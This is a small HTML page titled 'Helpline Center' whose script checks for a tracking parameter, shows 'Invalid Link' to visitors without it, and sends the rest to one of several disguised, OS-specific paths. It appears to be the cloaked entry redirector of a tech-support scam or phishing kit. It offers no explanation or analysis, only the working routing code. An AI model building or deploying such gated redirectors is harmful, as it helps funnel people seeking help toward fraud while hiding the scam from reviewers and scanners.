<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Helpline Center</title>

<script>
(function () {

    // Get query param safely
    function getQueryParam(param) {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get(param) || "";
    }

    // Detect OS properly
    function detectOS() {
        const ua = navigator.userAgent.toLowerCase();

        if (ua.includes("android")) return "Android";
        if (ua.includes("iphone") || ua.includes("ipad") || ua.includes("ipod")) return "iOS";
        if (ua.includes("mac")) return "MacOS";
        if (ua.includes("win")) return "Windows";
        return "Other";
    }

    // Get params
    let alpha = getQueryParam('alpha');
    let anph = getQueryParam('Anph');

    // Store alpha safely
    if (alpha !== "") {
        localStorage.setItem('alpha', alpha);
    }

    // Check required param
    if (anph === "") {
        document.body.innerHTML = "<h2 style='text-align:center;margin-top:50px;'>Invalid Link</h2>";
        return;
    }

    // Detect OS
    let os = detectOS();
    let redirectURL = "";

    // Redirect logic
    switch (os) {
        case "MacOS":
            redirectURL = "MerxiC0deinfousahtml/index.html";
            break;
        case "Android":
            redirectURL = "andx010usahTml/index.html";
            break;
        case "iOS":
            redirectURL = "ioxs010usxhYMl/index.html";
            break;
        case "Windows":
        default:
            redirectURL = "webC0deinfousavhtml/index.html";
    }

    // Redirect
    window.location.replace(redirectURL + "?Anph=" + encodeURIComponent(anph));

})();
</script>

</head>
<body>
<p style="text-align:center;margin-top:50px;">Redirecting...</p>
</body>
</html>
